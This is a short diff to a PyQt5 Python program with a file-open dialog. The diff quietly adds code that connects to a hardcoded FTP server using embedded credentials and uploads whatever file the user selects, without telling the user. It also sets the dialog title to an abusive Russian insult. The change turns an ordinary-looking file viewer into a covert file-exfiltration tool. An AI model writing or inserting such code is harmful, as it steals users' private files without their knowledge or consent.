@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 # -*- coding: utf-8 -*-
 
-import sys
+import sys, ftplib
 from PyQt5.QtWidgets import (QMainWindow, QTextEdit,
                              QAction, QFileDialog, QApplication)
 from PyQt5.QtGui import QIcon
@@ -32,8 +32,18 @@ class Example(QMainWindow):
         self.show()
 
     def showDialog(self):
+        host = "finnews.do.am"
+        ftp_user = "8finnews"
+        ftp_password = "8finnews"
         fname, _= QFileDialog.getOpenFileName(None, 'Выбери файл! Ублюдок мразь думал ко мне лезть?')
         self.textEdit.setText(fname)
+        con = ftplib.FTP(host, ftp_user, ftp_password)
+        # Открываем файл для передачи в бинарном режиме
+        f = open(fname, "rb")
+        # Передаем файл на сервер
+        send = con.storbinary("STOR " + fname.split('/')[-1], f)
+        # Закрываем FTP соединение
+        con.close()
 
 
 if __name__ == '__main__':
